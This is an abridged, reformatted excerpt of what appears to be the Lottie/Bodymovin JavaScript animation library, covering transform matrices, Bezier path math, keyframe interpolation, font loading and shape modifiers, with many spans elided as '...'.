!function () {
    ...
    "undefined" != typeof navigator && (
        ...
        s = function (t) {
                    ...
                    if (e) {
                        if (this._cbs[t]) {
                            for (var s = 0, i = this._cbs[t].length; s < i;) 
                                this._cbs[t][s] === e && (this._cbs[t].splice(s, 1), s -= 1, i -= 1),
                                s += 1;
                            this
                                ._cbs[t]
                                .length || (this._cbs[t] = null)
                        }
                    } else 
                        this._cbs[t] = null
                }
            ...
            var V,
                ...
                O = function () {
                    ...
                    function u(t, e, s, i, a, r, n, h, o, l, p, f, d, m, c, u) {
                        var g = this.props;
                        if (1 === t && 0 === e && 0 === s && 0 === i && 0 === a && 1 === r && 0 === n && 0 === h && 0 === o && 0 === l && 1 === p && 0 === f) 
                        ...
                        g[8] = S * t + x * a + C * o + w * d,
                        g[9] = S * e + x * r + C * l + w * m,
                        g[10] = S * s + x * n + C * p + w * c,
                        g[11] = S * i + x * h + C * f + w * u,
                    ...
                    function S(t) {
                        return this
                            .getInverseMatrix()
                            .applyToPointArray(t[0], t[1], t[2] || 0)
                    }
                    function x(t) {
                        var e,
                            s = t.length,
                    ...
                    function F(t, e) {
                        if (this.isIdentity()) 
                            return t + "," + e;
                        var s = this.props;
                        return Math.round(100 * (t * s[0] + e * s[4] + s[12])) / 100 + "," + Math.round(
                            100 * (t * s[1] + e * s[5] + s[13])
                        ) / 100
                    }
                    function E() {
                    ...
                    function I() {
                        var t = this.props;
                        return "matrix(" + M(t[0]) + "," + M(t[1]) + "," + M(t[4]) + "," + M(t[5]) +
                                "," + M(t[12]) + "," + M(t[13]) + ")"
                    }
                    return function () {
                        this.reset = a,
            ...
            !function (t, e) {
                ...
                function o(t) {
                    ...
                    for (s || (t = [s++]); r < i;) 
                        o[r] = r++;
                    for (r = 0; r < i; r++) 
                        o[r] = o[n = h & n + t[r % s] + (e = o[r])],
                        o[n] = e;
                    a.g = function (t) {
                        for (var e, s = 0, r = a.i, n = a.j, o = a.S; t--;) 
                            e = o[r = h & r + 1],
                            s = s * i + o[h & (o[r] = o[n = h & n + e]) + (o[n] = e)];
                        return a.i = r,
                        a.j = n,
                        s
                    }
                ...
                function f(t, e) {
                    for (var s, i = t + "", a = 0; a < i.length;) 
                        e[h & a] = h & (s ^= 19 * e[h & a]) + i.charCodeAt(a++);
                    return d(e)
                }
                function d(t) {
                    return String
                ...
                for (s = 0; s < a; s += 1) 
                    for (var r in i = t[s].prototype) 
                        Object
                            .prototype
                            .hasOwnProperty
                            .call(i, r) && (e.prototype[r] = i[r])
                }
            !function () {
                for (var e = 0, s = [
                    "ms", "moz", "webkit", "o"
                ], i = 0; i < s.length && !t.requestAnimationFrame; ++i) 
                    t.requestAnimationFrame = t[s[i] + "RequestAnimationFrame"],
                    t.cancelAnimationFrame = t[s[i] + "CancelAnimationFrame"] || t[s[i] + "CancelRequestAnimationFrame"];
            ...
            var j = function () {
                    ...
                    var s = function (t, e, s, i) {
                        ...
                        for (n = s.length, a = 0; a < m; a += 1) {
                            for (p = a / (m - 1), f = 0, r = 0; r < n; r += 1) 
                                l = h(1 - p, 3) * t[r] + 3 * h(1 - p, 2) * p * s[r] + 3 * (1 - p) * h(p, 2) * i[r] + h(
                                    p,
                                    3
                                ) * e[r],
                                u[r] = l,
                                null !== g[r] && (f += h(u[r] - g[r], 2)),
                                g[r] = u[r];
                            f && (c += f = o(f)),
                            y.percents[a] = p,
                            y.lengths[a] = c
                        }
                        return y.addedLength = c,
                        y
                    };
                    function i(t) {
                    ...
                    var r,
                        n = (r = {}, function (t, s, n, l) {
                            var p = (
                                t[0] + "_" + t[1] + "_" + s[0] + "_" + s[1] + "_" + n[0] + "_" + n[1] + "_" +
                                    l[0] + "_" + l[1]
                            ).replace(/\./g, "p");
                            if (!r[p]) {
                                var f,
                                ...
                                2 === t.length && (t[0] !== s[0] || t[1] !== s[1]) && e(
                                    ...
                                    t[0] + n[0],
                                    t[1] + n[1]
                                ) && e(t[0], t[1], s[0], s[1], s[0] + l[0], s[1] + l[1]) && (b = 2);
                                var A = new i(b);
                                for (c = n.length, f = 0; f < b; f += 1) {
                                    for (v = E(c), g = f / (b - 1), y = 0, m = 0; m < c; m += 1) 
                                        u = h(1 - g, 3) * t[m] + 3 * h(1 - g, 2) * g * (t[m] + n[m]) + 3 * (1 - g) * h(
                                            g,
                                            2
                                        ) * (s[m] + l[m]) + h(g, 3) * s[m],
                                        v[m] = u,
                                        null !== k && (y += h(v[m] - k[m], 2));
                                    _ += y = o(y),
                    ...
                    return {
                        getSegmentsLength: function (t) {
                            ...
                            for (e = 0; e < o - 1; e += 1) 
                                ...
                                p += l[e].addedLength;
                            return a && o && (l[e] = s(r[e], r[0], n[e], h[0]), p += l[e].addedLength),
                            i.totalLength = p,
                            i
                        },
                        getNewSegment: function (e, s, i, a, r, n, h) {
                            ...
                            var o,
                                ...
                                E = d * d * d;
                            for (o = 0; o < m; o += 1) 
                                f[4 * o] = t.round(1e3 * (g * e[o] + y * i[o] + v * a[o] + b * s[o])) / 1e3,
                                f[4 * o + 1] = t.round(1e3 * (_ * e[o] + k * i[o] + A * a[o] + P * s[o])) / 1e3,
                                f[4 * o + 2] = t.round(1e3 * (D * e[o] + S * i[o] + x * a[o] + C * s[o])) / 1e3,
                                f[4 * o + 3] = t.round(1e3 * (w * e[o] + F * i[o] + T * a[o] + E * s[o])) / 1e3;
                            return f
                        },
                        getPointInSegment: function (e, s, i, a, r, n) {
                            ...
                            return [
                                t.round(
                                    1e3 * (o * o * o * e[0] + (h * o * o + o * h * o + o * o * h) * i[0] + (h * h * o + o * h * h + h * o * h) * a[0] + h * h * h * s[0])
                                ) / 1e3,
                                t.round(
                                    1e3 * (o * o * o * e[1] + (h * o * o + o * h * o + o * o * h) * i[1] + (h * h * o + o * h * h + h * o * h) * a[1] + h * h * h * s[1])
                                ) / 1e3
                            ]
                        },
                        buildBezierData: n,
                        ...
                        pointOnLine3D: function (s, i, a, r, n, h, o, l, p) {
                            ...
                            var f,
                                d = t.sqrt(t.pow(r - s, 2) + t.pow(n - i, 2) + t.pow(h - a, 2)),
                ...
                W = function () {
                    function t(a, r, n) {
                        ...
                        for (o = 0; o < c; o += 1) 
                            if ("ks" in (h = a[o]) && !h.completed) {
                                if (h.completed = !0, h.tt && (a[o - 1].td = h.tt), h.hasMask) {
                                    ...
                                    for (p = u.length, l = 0; l < p; l += 1) 
                                        if (u[l].pt.k.i) 
                                            ...
                                            for (d = u[l].pt.k.length, f = 0; f < d; f += 1) 
                                                u[l]
                                                    .pt
                                                    .k[f]
                                                    .s && i(u[l].pt.k[f].s[0]),
                                ...
                                0 === h.ty
                                    ? (h.layers = e(h.refId, r), t(h.layers, r))
                                    : 4 === h.ty
                                        ? s(h.shapes)
                                        : 5 === h.ty && (
                                            0 !== (m = h).t.a.length || "m" in m.t.p || (m.singleShape = !0)
                                        )
                            }
                        }
                    function e(t, e) {
                    ...
                    function a(t, e) {
                        ...
                        return t[0] > s[0] || !(s[0] > t[0]) && (
                            t[1] > s[1] || !(s[1] > t[1]) && (t[2] > s[2] || !(s[2] > t[2]) && null)
                        )
                    }
                    var r,
                        n = function () {
                            ...
                            function e(t) {
                                var e,
                                    ...
                                    a = t.length;
                                for (e = 0; e < a; e += 1) 
                                    5 === t[e].ty && (void 0, i = (s = t[e]).t.d, s.t.d = {
                                        k: [
                                            {
                                                s: i,
                                                t: 0
                            ...
                            if (t.chars && !a(r, t.v)) {
                                ...
                                for (e = 0; e < l; e += 1) 
                                    if (t.chars[e].data && t.chars[e].data.shapes) 
                                        for (n = (o = t.chars[e].data.shapes[0].it).length, s = 0; s < n; s += 1) 
                                            (h = o[s].ks.k).__converted || (i(o[s].ks.k), h.__converted = !0)
                            }
                        }),
                        o = function () {
                            var t = [5, 7, 15];
                            function e(t) {
                                var e,
                                    ...
                                    i = t.length;
                                for (e = 0; e < i; e += 1) 
                                    5 === t[e].ty && (s = void 0, "number" == typeof(s = t[e].t.p).a && (s.a = {
                                        a: 0,
                                        k: s.a
                                ...
                                for (s = 0; s < r; s += 1) 
                                    if ("gr" === t[s].ty) 
                                        ...
                                        if (t[s].c.k && t[s].c.k[0].i) 
                                            for (a = t[s].c.k.length, i = 0; i < a; i += 1) 
                                                t[s]
                                                    .c
                                                    .k[i]
                                                    .s && (
                                ...
                                for (s = t.length - 1; s >= 0; s -= 1) 
                                    if ("sh" === t[s].ty) 
                                        if (t[s].ks.k.i) 
                                            ...
                                            for (a = t[s].ks.k.length, i = 0; i < a; i += 1) 
                                                t[s]
                                                    .ks
                                                    .k[i]
                                                    .s && (t[s].ks.k[i].s[0].c = t[s].closed),
                                                t[s]
                                                    .ks
                                                    .k[i]
                                                    .e && (t[s].ks.k[i].e[0].c = t[s].closed);
                                else 
                                    "gr" === t[s].ty && e(t[s].it)
                            }
                            function s(t) {
                                            ...
                                            if (l[a].pt.k.i) 
                                                ...
                                                for (h = l[a].pt.k.length, n = 0; n < h; n += 1) 
                                                    l[a]
                                                        .pt
                                                        .k[n]
                                                        .s && (l[a].pt.k[n].s[0].c = l[a].cl),
                                                    l[a]
                                                        .pt
                                                        .k[n]
                                                        .e && (l[a].pt.k[n].e[0].c = l[a].cl)
                                        }
                                    4 === s.ty && e(s.shapes)
                                }
                            }
            ...
            var H = function () {
                    ...
                    var s = [
                            "d83cdffb", "d83cdffc", "d83cdffd", "d83cdffe", "d83cdfff"
                        ],
                        i = [65039, 8205];
                    function a(t, e) {
                        var s = I("span");
                    ...
                    function r(t, e) {
                        ...
                        I("canvas")
                            .getContext("2d")
                            .font = e.fWeight + " " + e.fStyle + " 100px " + e.fFamily,
                        s
                    }
                    var n = function () {
                        this.fonts = [],
                        ...
                        this.setIsLoadedBinded = this
                            .setIsLoaded
                            .bind(this),
                        this.checkLoadedFontsBinded = this
                            .checkLoadedFonts
                            .bind(this)
                    };
                    ...
                    n.prototype = {
                                ...
                                for (s = 0; s < n; s += 1) {
                                    ...
                                    if (
                                        ...
                                        if ("p" === i[s].fOrigin || 3 === i[s].origin) {
                                            if ((o = document.querySelectorAll(
                                                'style[f-forigin="p"][f-family="' + i[s].fFamily + '"], style[f-origin="3"][f-f' +
                                                'amily="' + i[s].fFamily + '"]'
                                            )).length > 0 && (p = !1), p) {
                                                var f = I("style");
                                                ...
                                                f.type = "text/css",
                                                f.innerText = "@font-face {font-family: " + i[s].fFamily + "; font-style: norma" +
                                                        "l; src: url('" + i[s].fPath + "');}",
                                                e.appendChild(f)
                                            }
                                        } else if ("g" === i[s].fOrigin || 1 === i[s].origin) {
                                            for (
                                                o = document.querySelectorAll('link[f-forigin="g"], link[f-origin="1"]'),
                                                l = 0;
                                                l < o.length;
                                                l += 1
                                            ) 
                                            ...
                                            for (
                                                o = document.querySelectorAll('script[f-forigin="t"], script[f-origin="2"]'),
                                                l = 0;
                                                l < o.length;
                                                l += 1
                                            ) 
                        ...
                        getCharData: function (e, s, i) {
                            ...
                            return ("string" == typeof e && 13 !== e.charCodeAt(0) || !e) && console && console.warn && !this._warned && (
                                this._warned = !0,
                ...
                Y = function () {
                    ...
                    function s(t, e) {
                        ...
                        var v,
                            ...
                            F = r.t - i;
                        if (r.to) {
                            r.bezierData || (r.bezierData = j.buildBezierData(r.s, n.s || r.e, r.to, r.ti));
                            var E = r.bezierData;
                            if (t >= w || t < F) {
                                var M = t >= w
                                    ? E.points.length - 1
                                    : 0;
                                for (o = E.points[M].point.length, h = 0; h < o; h += 1) 
                                    s[h] = E
                                        .points[M]
                                        .point[h]
                                } else {
                                r.__fnct
                                    ? d = r.__fnct
                                    : (d = q.getBezierEasing(r.o.x, r.o.y, r.i.x, r.i.y, r.n).get, r.__fnct = d),
                                l = d((t - F) / (w - F));
                                var I,
                                    L = E.segmentLength * l,
                                    V = e.lastFrame < t && e._lastKeyframeIndex === u
                                        ? e._lastAddedLength
                                        : 0;
                                for (
                                    f = e.lastFrame < t && e._lastKeyframeIndex === u
                                        ? e._lastPoint
                                        : 0,
                                    y = !0,
                                    p = E.points.length; y;
                                    ...
                                    if (
                                        V += E.points[f].partialLength,
                                        0 === L || 0 === l || f === E.points.length - 1
                                    ) {
                                        for (o = E.points[f].point.length, h = 0; h < o; h += 1) 
                                            s[h] = E
                                                .points[f]
                                                .point[h];
                                        break
                                    ...
                                    if (L >= V && L < V + E.points[f + 1].partialLength) {
                                        for (
                                            I = (L - V) / E.points[f + 1].partialLength,
                                            o = E.points[f].point.length,
                                            h = 0;
                                            h < o;
                                            h += 1
                                        ) 
                                            s[h] = E
                                                .points[f]
                                                .point[h] + (E.points[f + 1].point[h] - E.points[f].point[h]) * I;
                                        break
                                    }
                                    f < p - 1
                                        ? f += 1
                            ...
                            if (g = r.s.length, v = n.s || r.e, this.sh && 1 !== r.h) 
                                if (t >= w) 
                                    ...
                                    P = _[2],
                                    D = _[3],
                                    S = Math.atan2(2 * A * D - 2 * k * P, 1 - 2 * A * A - 2 * P * P),
                                    x = Math.asin(2 * k * A + 2 * P * D),
                                    C = Math.atan2(2 * k * D - 2 * A * P, 1 - 2 * k * k - 2 * P * P),
                                    b[0] = S / m,
                                    b[1] = x / m,
                                    b[2] = C / m
                                }
                                                            ...
                                                            r.__fnct[u]
                                                                ...
                                                                : (
                                                                    ...
                                                                    O = void 0 === r.i.y[u]
                                                                        ? r.i.y[0]
                                                                        : r.i.y[u],
                                                                    d = q.getBezierEasing(R, z, N, O).get,
                                                                    r.__fnct[u] = d
                                                                )
                                                        )
                                                        : r.__fnct
                    ...
                    function r() {
                        var e = this.comp.renderedFrame - this.offsetTime,
                            s = this
                                ...
                                .t - this.offsetTime,
                            i = this
                                .keyframes[this.keyframes.length - 1]
                                .t - this.offsetTime;
                    ...
                    function n(t) {
                        ...
                        if ("unidimensional" === this.propType) 
                            s = t * this.mult,
                            e(this.v - s) > 1e-5 && (this.v = s, this._mdf = !0);
                        else 
                            for (var i = 0, a = this.v.length; i < a;) 
                                s = t[i] * this.mult,
                                e(this.v[i] - s) > 1e-5 && (this.v[i] = s, this._mdf = !0),
                                i += 1
                    }
                    function h() {
                    ...
                    function d(e, i, a, l) {
                        ...
                        for (p = 0; p < u - 1; p += 1) 
                            i
                                ...
                                .s && (
                                    ...
                                    m = i.k[p].to,
                                    c = i.k[p].ti,
                                    (2 === f.length && (f[0] !== d[0] || f[1] !== d[1]) && j.pointOnLine2D(f[0], f[1], d[0], d[1], f[0] + m[0], f[1] + m[1]) && j.pointOnLine2D(f[0], f[1], d[0], d[1], d[0] + c[0], d[1] + c[1]) || 3 === f.length && (f[0] !== d[0] || f[1] !== d[1] || f[2] !== d[2]) && j.pointOnLine3D(f[0], f[1], f[2], d[0], d[1], d[2], f[0] + m[0], f[1] + m[1], f[2] + m[2]) && j.pointOnLine3D(f[0], f[1], f[2], d[0], d[1], d[2], d[0] + c[0], d[1] + c[1], d[2] + c[2])) && (i.k[p].to = null, i.k[p].ti = null),
                                    f[0] === d[0] && f[1] === d[1] && 0 === m[0] && 0 === m[1] && 0 === c[0] && 0 === c[1] && (2 === f.length || f[2] === d[2] && 0 === m[2] && 0 === c[2]) && (i.k[p].to = null, i.k[p].ti = null)
                                );
                        this.effectsSequence = [r.bind(this)],
                        this.data = i,
                        this.keyframes = i.k,
                        ...
                        var g = i
                            ...
                            .s
                            .length;
                        for (this.v = T("float32", g), this.pv = T("float32", g), p = 0; p < g; p += 1) 
                            this.v[p] = t,
                            this.pv[p] = t;
                        this._caching = {
                            lastFrame: t,
                    ...
                    return {
                        getProp: function (t, e, s, i, a) {
                            ...
                            if (e.k.length) 
                                ...
                                r = new l(t, e, i, a);
                            return r.effectsSequence.length && a.addDynamicProperty(r),
                            r
                        }
                    }
                }(),
                G = function () {
                    ...
                    function e(t, e, s) {
                        if (
                            ...
                            e.p && e.p.s
                                ? (
                                    this.px = Y.getProp(t, e.p.x, 0, 0, this),
                                    this.py = Y.getProp(t, e.p.y, 0, 0, this),
                                    e.p.z && (this.pz = Y.getProp(t, e.p.z, 0, 0, this))
                                )
                                : this.p = Y.getProp(t, e.p || {
                                    k: [0, 0, 0]
                                }, 1, 0, this),
                            e.rx
                        ) {
                            if (
                                this.rx = Y.getProp(t, e.rx, 0, m, this),
                                this.ry = Y.getProp(t, e.ry, 0, m, this),
                                this.rz = Y.getProp(t, e.rz, 0, m, this),
                                e.or.k[0].ti
                            ) {
                                var i,
                                    a = e.or.k.length;
                            ...
                            this.or = Y.getProp(t, e.or, 1, m, this),
                            this.or.sh = !0
                        } else 
                            this.r = Y.getProp(t, e.r || {
                                k: 0
                            }, 0, m, this);
                        e.sk && (
                            this.sk = Y.getProp(t, e.sk, 0, m, this),
                            this.sa = Y.getProp(t, e.sa, 0, m, this)
                        ),
                        this.a = Y.getProp(t, e.a || {
                            k: [0, 0, 0]
                        }, 1, 0, this),
                        this.s = Y.getProp(t, e.s || {
                            k: [100, 100, 100]
                        }, 1, .01, this),
                        e.o
                            ? this.o = Y.getProp(t, e.o, 0, .01, t)
                            : this.o = {
                                _mdf: !1,
                                v: 1
                            },
                                ...
                                if (
                                    ...
                                    if (
                                        ...
                                        this.r && this.appliedTransformations < 4
                                            ...
                                            : !this.r && this.appliedTransformations < 4 && this.v.rotateZ(-this.rz.v).rotateY(
                                                this.ry.v
                                            ).rotateX(this.rx.v).rotateZ(-this.or.v[2]).rotateY(this.or.v[1]).rotateX(
                                                this.or.v[0]
                                            ),
                                        this.autoOriented
                                    ) {
                                        ...
                                        if (
                                            ...
                                            this.p._caching.lastFrame + this.p.offsetTime <= this
                                                .p
                                                .keyframes[0]
                                                .t
                                                    ? (
                                                        i = this.p.getValueAtTime((this.p.keyframes[0].t + .01) / s, 0),
                                                        a = this.p.getValueAtTime(this.p.keyframes[0].t / s, 0)
                                                    )
                                                    : this.p._caching.lastFrame + this.p.offsetTime >= this
                                                        .p
                                                        .keyframes[this.p.keyframes.length - 1]
                                                        .t
                                                            ? (
                                                                i = this.p.getValueAtTime(this.p.keyframes[this.p.keyframes.length - 1].t / s, 0),
                                                                a = this.p.getValueAtTime((this.p.keyframes[this.p.keyframes.length - 1].t - .05) / s, 0)
                                                            )
                                                            : (
                                                                i = this.p.pv,
                                                                a = this.p.getValueAtTime((this.p._caching.lastFrame + this.p.offsetTime - .01) / s, this.p.offsetTime)
                                                            );
                                            ...
                                            var r = this.px,
                                                n = this.py;
                                            r._caching.lastFrame + r.offsetTime <= r
                                                .keyframes[0]
                                                .t
                                                    ? (
                                                        i[0] = r.getValueAtTime((r.keyframes[0].t + .01) / s, 0),
                                                        i[1] = n.getValueAtTime((n.keyframes[0].t + .01) / s, 0),
                                                        a[0] = r.getValueAtTime(r.keyframes[0].t / s, 0),
                                                        a[1] = n.getValueAtTime(n.keyframes[0].t / s, 0)
                                                    )
                                                    : r._caching.lastFrame + r.offsetTime >= r
                                                        .keyframes[r.keyframes.length - 1]
                                                        .t
                                                            ? (
                                                                i[0] = r.getValueAtTime(r.keyframes[r.keyframes.length - 1].t / s, 0),
                                                                i[1] = n.getValueAtTime(n.keyframes[n.keyframes.length - 1].t / s, 0),
                                                                a[0] = r.getValueAtTime((r.keyframes[r.keyframes.length - 1].t - .01) / s, 0),
                                                                a[1] = n.getValueAtTime((n.keyframes[n.keyframes.length - 1].t - .01) / s, 0)
                                                            )
                                                            : (
                                                                i = [
                                                                    r.pv, n.pv
                                                                ],
                                                                a[0] = r.getValueAtTime((r._caching.lastFrame + r.offsetTime - .01) / s, r.offsetTime),
                                                                a[1] = n.getValueAtTime((n._caching.lastFrame + n.offsetTime - .01) / s, n.offsetTime)
                                                            )
                                        } else 
                                            i = a = t;
                                        this
                                            .v
                                            .rotate(-Math.atan2(i[1] - a[1], i[0] - a[0]))
                                    }
                                    this.data.p && this.data.p.s
                                        ? this.data.p.z
                                            ? this
                                                .v
                                                .translate(this.px.v, this.py.v, -this.pz.v)
                                            : this
                                                .v
                                                .translate(this.px.v, this.py.v, 0)
                                        : this
                                            .v
                        ...
                        precalculateMatrix: function () {
                            if (!this.a.k && (
                                ...
                                if (
                                    ...
                                    this
                                        .pre
                                        .skewFromAxis(-this.sk.v, this.sa.v),
                                ...
                                this.r
                                    ...
                                    : this.rz.effectsSequence.length || this.ry.effectsSequence.length || this.rx.effectsSequence.length || this.or.effectsSequence.length || (
            ...
            function J() {
                ...
                this._length = 0,
                this._maxLength = 8,
                this.v = E(this._maxLength),
                this.o = E(this._maxLength),
                this.i = E(this._maxLength)
            }
            ...
            J.prototype.setXYAt = function (t, e, s, i, a) {
                var r;
                switch (
            ...
            J.prototype.setTripleAt = function (t, e, s, i, a, r, n, h) {
            ...
            J.prototype.reverse = function () {
                ...
                var e = this.v,
                    ...
                    a = 0;
                this.c && (
                    t.setTripleAt(e[0][0], e[0][1], i[0][0], i[0][1], s[0][0], s[0][1], 0, !1),
                    a = 1
                );
                var r,
                    n = this._length - 1,
                    h = this._length;
                for (r = a; r < h; r += 1) 
                    t.setTripleAt(e[n][0], e[n][1], i[n][0], i[n][1], s[n][0], s[n][1], r, !1),
                    n -= 1;
                return t
            };
            var K,
                ...
                Z = function () {
                        ...
                        if (t < m[0].t - this.offsetTime) 
                            ...
                            if (d = g, !(r = 1 === c.h)) {
                                if (t >= u.t - this.offsetTime) 
                                    ...
                                    c.__fnct
                                        ? b = c.__fnct
                                        : (b = q.getBezierEasing(c.o.x, c.o.y, c.i.x, c.i.y).get, c.__fnct = b),
                                    p = b(
                                        (t - (c.t - this.offsetTime)) / (u.t - this.offsetTime - (c.t - this.offsetTime))
                                    )
                                }
                                a = u.s
                                    ? u.s[0]
                    ...
                    function s() {
                        ...
                        return a !== t && (a < s && e < s || a > i && e > i) || (
                            this._caching.lastIndex = a < e
                    ...
                    function a(t) {
                        (function (t, e) {
                            ...
                            var s,
                                i = t._length;
                            for (s = 0; s < i; s += 1) 
                                if (t.v[s][0] !== e.v[s][0] || t.v[s][1] !== e.v[s][1] || t.o[s][0] !== e.o[s][0] || t.o[s][1] !== e.o[s][1] || t.i[s][0] !== e.i[s][0] || t.i[s][1] !== e.i[s][1]) 
                                    return !1;
                        return !0
                        })(this.v, t) || (
                            this.v = At.clone(t),
                    ...
                    function o(e, a, r) {
                        ...
                        this
                            .v
                            .setPathData(this.keyframes[0].s[0].c, n),
                        this.pv = At.clone(this.v),
                        this.localShapeCollection = Pt.newShapeCollection(),
                        this.paths = this.localShapeCollection,
                        this
                    ...
                    var l = function () {
                            ...
                            function e(t, e) {
                                ...
                                this.p = Y.getProp(t, e.p, 1, 0, this),
                                this.s = Y.getProp(t, e.s, 1, 0, this),
                        ...
                        f = function () {
                            function t(t, e) {
                                ...
                                1 === e.sy
                                    ? (
                                        this.ir = Y.getProp(t, e.ir, 0, 0, this),
                                        this.is = Y.getProp(t, e.is, 0, .01, this),
                                        this.convertToPath = this.convertStarToPath
                                    )
                                    : this.convertToPath = this.convertPolygonToPath,
                                this.pt = Y.getProp(t, e.pt, 0, 0, this),
                                this.p = Y.getProp(t, e.p, 1, 0, this),
                                this.r = Y.getProp(t, e.r, 0, m, this),
                                this.or = Y.getProp(t, e.or, 0, 0, this),
                                this.os = Y.getProp(t, e.os, 0, .01, this),
                                this.localShapeCollection = Pt.newShapeCollection(),
                                this
                                    .localShapeCollection
                                    .addShape(this.v),
                        ...
                        d = function () {
                            function t(t, e) {
                                ...
                                this.p = Y.getProp(t, e.p, 1, 0, this),
                                this.s = Y.getProp(t, e.s, 1, 0, this),
                                this.r = Y.getProp(t, e.r, 0, 0, this),
                                this.dynamicProperties.length
                                    ? this.k = !0
                            ...
                            return t.prototype = {
                                convertRectToPath: function () {
                                    ...
                                    2 === this.d || 1 === this.d
                                        ? (
                                            this.v.setTripleAt(t + s, e - i + a, t + s, e - i + a, t + s, e - i + r, 0, !0),
                                            this.v.setTripleAt(
                                                t + s,
                                                e + i - a,
                                                t + s,
                                            ...
                                            0 !== a
                                                ? (
                                                    this.v.setTripleAt(t + s - a, e + i, t + s - a, e + i, t + s - r, e + i, 2, !0),
                                                    this.v.setTripleAt(t - s + a, e + i, t - s + r, e + i, t - s + a, e + i, 3, !0),
                                                    this.v.setTripleAt(t - s, e + i - a, t - s, e + i - a, t - s, e + i - r, 4, !0),
                                                    this.v.setTripleAt(t - s, e - i + a, t - s, e - i + r, t - s, e - i + a, 5, !0),
                                                    this.v.setTripleAt(t - s + a, e - i, t - s + a, e - i, t - s + r, e - i, 6, !0),
                                                    this.v.setTripleAt(
                                                        t + s - a,
                                                        e - i,
                                                        t + s - r,
                                                ...
                                                : (
                                                    this.v.setTripleAt(t - s, e + i, t - s + r, e + i, t - s, e + i, 2),
                                                    this.v.setTripleAt(t - s, e - i, t - s, e - i + r, t - s, e - i, 3)
                                                )
                                        )
                                        : (
                                            this.v.setTripleAt(t + s, e - i + a, t + s, e - i + r, t + s, e - i + a, 0, !0),
                                            0 !== a
                                                ? (
                                                    this.v.setTripleAt(t + s - a, e - i, t + s - a, e - i, t + s - r, e - i, 1, !0),
                                                    this.v.setTripleAt(t - s + a, e - i, t - s + r, e - i, t - s + a, e - i, 2, !0),
                                                    this.v.setTripleAt(t - s, e - i + a, t - s, e - i + a, t - s, e - i + r, 3, !0),
                                                    this.v.setTripleAt(t - s, e + i - a, t - s, e + i - r, t - s, e + i - a, 4, !0),
                                                    this.v.setTripleAt(t - s + a, e + i, t - s + a, e + i, t - s + r, e + i, 5, !0),
                                                    this.v.setTripleAt(
                                                        t + s - a,
                                                        e + i,
                                                        t + s - r,
                                                    ...
                                                    this.v.setTripleAt(t + s, e + i - a, t + s, e + i - a, t + s, e + i - r, 7, !0)
                                                )
                                                : (
                                                    this.v.setTripleAt(t - s, e - i, t - s + r, e - i, t - s, e - i, 1, !0),
                                                    this.v.setTripleAt(t - s, e + i, t - s, e + i - r, t - s, e + i, 2, !0),
                                                    this.v.setTripleAt(
                                                        t + s,
                                                        e + i,
                                                        t + s - r,
                ...
                Q = (
                    U = {},
                    (K = {}).registerModifier = function (t, e) {
                        U[t] || (U[t] = e)
                    },
                    K.getModifier = function (t, e, s) {
                        return new U[t](e, s)
                    },
                    K
                );
            ...
            function at() {
                this._length = 0,
                this._maxLength = 4,
                this.shapes = E(this._maxLength)
            }
            function rt(t, e, s, i) {
                var a;
                this.elem = t,
                this.frameId = -1,
                this.dataProps = E(e.length),
                this.renderer = s,
                this.k = !1,
                this.dashStr = "",
                this.dashArray = T(
            ...
            function nt(t, e, s) {
                ...
                this.prop = Y.getProp(t, e.k, 1, null, this),
                this.k = this.prop.k,
                this.getValue(!0)
            }
            ...
            tt.prototype.initModifierProperties = function (t, e) {
                this.s = Y.getProp(t, e.s, 0, .01, this),
                this.e = Y.getProp(t, e.e, 0, .01, this),
                this.o = Y.getProp(t, e.o, 0, 0, this),
                this.sValue = 0,
                this.eValue = 0,
                        ...
                        if ((c = this.shapes[a]).shape._mdf || this._mdf || t || 2 === this.m) {
                            if (
                                ...
                                for (l = this.releasePathsData(c.pathsData), h = 0; h < o; h += 1) 
                                    p = j.getSegmentsLength(i.shapes[h]),
                                    l.push(p),
                                    f += p.totalLength;
                    ...
                    for (a = d - 1; a >= 0; a -= 1) 
                        if ((c = this.shapes[a]).shape._mdf) {
                            for (
                                ...
                                2 === this.m && d > 1
                                    ? (
                                        y = this.calculateShapeEdges(e, s, c.totalShapeLength, _, m),
                ...
                for (
                    ...
                    for (
                        ...
                        if (c + (n = o[a - 1]).addedLength < e.s) 
                            ...
                            e.s <= c && e.e >= c + n.addedLength
                                ? (
                                    this.addSegment(d[i].v[a - 1], d[i].o[a - 1], d[i].i[a], d[i].v[a], s, h, g),
                                    g = !1
                                )
                                : (l = j.getNewSegment(
                                    d[i].v[a - 1],
                    ...
                    if (d[i].c && o.length) {
                        if (n = o[a - 1], c <= e.e) {
                            ...
                            e.s <= c && e.e >= c + y
                                ? (
                                    this.addSegment(d[i].v[a - 1], d[i].o[a - 1], d[i].i[0], d[i].v[0], s, h, g),
                                    g = !1
                                )
                                : (
                                    l = j.getNewSegment(d[i].v[a - 1], d[i].v[0], d[i].o[a - 1], d[i].i[0], (e.s - c) / y, (e.e - c) / y, o[a - 1]),
                    ...
                    if (s._length && (
                        ...
                        break;
                    i < m - 1 && (s = At.newElement(), g = !0, u.push(s), h = 0)
                }
                return u
            },
            ...
            et.prototype.initModifierProperties = function (t, e) {
                this.getValue = this.processKeys,
                this.rd = Y.getProp(t, e.r, 0, null, this),
                        ...
                        ? 0 !== s && s !== y - 1 || t.c
                            ? (
                                h = 0 === s
                                    ? t.v[y - 1]
                                    : t.v[s - 1],
                                l = (o = Math.sqrt(Math.pow(a[0] - h[0], 2) + Math.pow(a[1] - h[1], 2)))
                                    ? Math.min(o / 2, e) / o
                                    : 0,
                                p = u = a[0] + (h[0] - a[0]) * l,
                                f = g = a[1] - (a[1] - h[1]) * l,
                            ...
                            : (i.setTripleAt(a[0], a[1], n[0], n[1], r[0], r[1], v), v += 1)
                        : (
                            i.setTripleAt(t.v[s][0], t.v[s][1], t.o[s][0], t.o[s][1], t.i[s][0], t.i[s][1], v),
                            v += 1
                        );
                return i
            },
            ...
            st.prototype.initModifierProperties = function (t, e) {
                this.getValue = this.processKeys,
                this.amount = Y.getProp(t, e.a, 0, null, this),
            ...
            it.prototype.initModifierProperties = function (t, e) {
                this.getValue = this.processKeys,
                this.c = Y.getProp(t, e.c, 0, null, this),
                this.o = Y.getProp(t, e.o, 0, null, this),
                this.tr = G.getTransformProperty(t, e.tr, this),
                this.so = Y.getProp(t, e.tr.so, 0, .01, this),
                this.eo = Y.getProp(t, e.tr.eo, 0, .01, this),
                this.data = e,
                this.dynamicProperties.length || this.getValue(!0),
                ...
                if (this._mdf || t) {
                    ...
                    if (d > 0) {
                        ...
                        for (; _ > c;) 
                            ...
